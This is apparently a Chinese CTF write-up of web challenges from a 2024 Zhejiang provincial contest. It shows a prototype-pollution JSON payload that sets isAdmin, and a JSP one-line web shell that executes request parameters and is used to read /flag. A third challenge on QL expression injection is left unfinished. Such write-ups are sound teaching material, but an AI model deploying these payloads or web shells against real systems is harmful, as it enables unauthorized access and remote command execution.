# 2024 浙江省省赛初赛-WEB


# 2024 浙江省省赛初赛-WEB

## easyjs

&gt; [!TIP]
&gt;
&gt; 原型链污染简单应用

给了源码，提示是原型链污染漏洞

&gt; 源码找不到了，先用一下队里web大师傅的

![image-20241105164442279](https://asal1n.github.io/img/image-20241105164442279.png)

点名了原型链污染

通过POST方法到/api/notes一段JSON信息，可以修改isAdmin属性

POST传参到/api/notes

```
{
	&#34;id&#34;:&#34;1&#34;,
	&#34;__proto__&#34;:{
		&#34;isAdmin&#34;:&#34;1&#34;
	}
}
```

通过创建id=1的笔记，修改其属性的isAdmin值使其为1。

这个时候id=1的isAdmin被污染

通过访问flag页面得flag

```
/api/flag?note-id=1
```

## hack memory

&gt; [!TIP]
&gt;
&gt; 内存马的使用

dirsearch直接扫一下

发现有/shell/执行命令

直接上传一句话木马

```
&lt;% 
	java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&#34;cmd=&#34;)).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print(&#34;&lt;pre&gt;&#34;);
    while((a=in.read(b))!=-1){
    	out.println(new String(b,0,a));
    }
    out.print(&#34;&lt;/pre&gt;&#34;);
%&gt;
```

然后直接GET传参cmd来执行命令得到flag

```
/uploads/shell.jsp?cmd=cat /flag
```

## QL_again

&gt; [!TIP]
&gt;
&gt; QL表达式注入

待更新……

作者还在学😥😥

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-2024-%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B-web/  

